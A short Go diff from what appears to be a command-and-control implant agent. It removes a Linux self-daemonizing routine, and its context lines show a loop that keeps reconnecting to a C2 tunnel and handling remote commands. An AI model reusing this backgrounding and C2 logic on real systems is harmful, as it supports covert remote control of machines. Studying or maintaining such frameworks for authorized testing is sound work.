@@ -7,7 +7,6 @@ import (
 	"log"
 	"net"
 	"os"
-	"os/exec"
 	"os/user"
 	"path/filepath"
 	"runtime"
@@ -60,9 +59,6 @@ func agent_main() {
 	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
 	// Check if we're running as a library (CGO build)
 	is_dll := IsDLL()
-
-	exe_path := util.ProcExePath(os.Getpid())
-	daemonizeIfNeeded(verbose, is_dll, exe_path)
 
 	// applyRuntimeConfig
 	log.Println("Applying runtime config...")
@@ -283,21 +279,6 @@ connect:
 	c2transport.CCMsgTun(handler.HandleC2Command, ctx, cancel)
 	log.Printf("CC message tunnel closed, reconnecting")
 	goto connect
-}
-
-func daemonizeIfNeeded(verbose, is_shared_lib bool, exe_path string) {
-	log.Println("daemonizeIfNeeded...")
-	if runtime.GOOS == "linux" && !verbose && os.Getenv("DAEMON") != "true" && !is_shared_lib {
-		log.Println("Daemonizing...")
-		os.Setenv("DAEMON", "true")
-		cmd := exec.Command(exe_path)
-		cmd.Env = os.Environ()
-		err := cmd.Start()
-		if err != nil {
-			log.Fatalf("Daemonize: %v", err)
-		}
-		os.Exit(0)
-	}
 }
 
 func setupEnvironment() {
